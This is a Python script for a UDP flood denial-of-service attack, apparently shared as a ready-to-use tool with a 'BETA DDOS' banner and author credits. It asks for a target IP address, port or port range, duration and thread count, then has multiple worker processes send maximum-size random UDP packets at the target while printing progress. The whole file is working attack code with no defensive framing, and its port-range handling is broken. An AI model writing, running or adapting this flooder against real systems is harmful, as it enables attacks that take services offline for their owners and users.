import os
import time
import socket
import random
import threading
from multiprocessing import Pool
from datetime import datetime
import platform
import sys

# Define screen clear command based on OS
clear_cmd = "cls" if platform.system() == "Windows" else "clear"

# ANSI color codes
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

now = datetime.now()
print(f"{GREEN}Attack started: {now.strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

os.system(clear_cmd)

print(f"""{RED}
  BBBBB   EEEEE  TTTTTТТ   AAAA      DDDD    DDDD    OOO   SSSSS
  B    B  E         T     A    A     D   D   D   D   O   O  S
  BBBBB   EEEE      T     AAAAAA     D   D   D   D   O   O  SSSS
  B    B  E         T     A    A     D   D   D   D   O   O     S
  BBBBB   EEEEE     T     A    A     DDDD    DDDD    OOO   SSSSS
{RESET}\n""")

print(f"{YELLOW}Author   : Adresatov")
print(f"TEAM     : Collapse\n{RESET}")

ip = input(f"{BLUE}Enter target IP address: {RESET}")

while True:
    try:
        port_input = input(f"{BLUE}Enter port or port range (e.g., 1 or 1-80): {RESET}")
        if '-' in port_input:
            port_range = port_input.split('-')
            port_start = int(port_range[0])
            port_end = int(port_range[1])
            if 1 <= port_start <= 65535 and 1 <= port_end <= 65535 and port_start <= port_end:
                break
            else:
                print(f"{RED}Error: The port range must be between 1 and 65535.{RESET}")
        else:
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            else:
                print(f"{RED}Error: The port must be between 1 and 65535.{RESET}")
    except ValueError:
        print(f"{RED}Error: Enter a valid port or port range.{RESET}")

while True:
    try:
        duration = int(input(f"{BLUE}Enter attack duration in seconds: {RESET}"))
        if duration > 0:
            break
        else:
            print(f"{RED}Error: Enter a positive number.{RESET}")
    except ValueError:
        print(f"{RED}Error: Enter a numeric value.{RESET}")

while True:
    try:
        threads_count = int(input(f"{BLUE}Enter the number of threads (1-100): {RESET}"))
        if 1 <= threads_count <= 100:
            break
        else:
            print(f"{RED}Error: Enter a number between 1 and 100.{RESET}")
    except ValueError:
        print(f"{RED}Error: Enter a numeric value.{RESET}")

os.system(clear_cmd)

# Fancy loading animation
def loading_animation():
    symbols = ["|", "/", "-", "\\"]
    print(f"{YELLOW}Starting attack...{RESET}", end=" ", flush=True)
    for _ in range(10):
        for symbol in symbols:
            sys.stdout.write(f"\r{YELLOW}Starting attack... {symbol}{RESET}")
            sys.stdout.flush()
            time.sleep(0.2)
    print("\r" + " " * 30, end="\r")  # Clear line

loading_animation()

print(f"{GREEN}Attack initiated!{RESET}")

def attack(_):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(65507)
    sent = 0
    start_time = time.time()

    if 'port_range' in locals():
        ports = range(port_start, port_end + 1)
    else:
        ports = [port]

    try:
        while time.time() - start_time < duration:
            attack_port = random.choice(ports)
            sock.sendto(bytes_data, (ip, attack_port))
            sent += 1
            if sent % 1000 == 0:
                print(f"{GREEN}Sent {sent} packets to {ip} via port {attack_port}{RESET}")
    except KeyboardInterrupt:
        print(f"\n{RED}Attack stopped by user.{RESET}")
    except Exception as e:
        print(f"\n{RED}An error occurred: {e}{RESET}")

def run_attack():
    with Pool(threads_count) as pool:
        pool.map(attack, range(threads_count))

run_attack()

print(f"{GREEN}Attack finished!{RESET}")
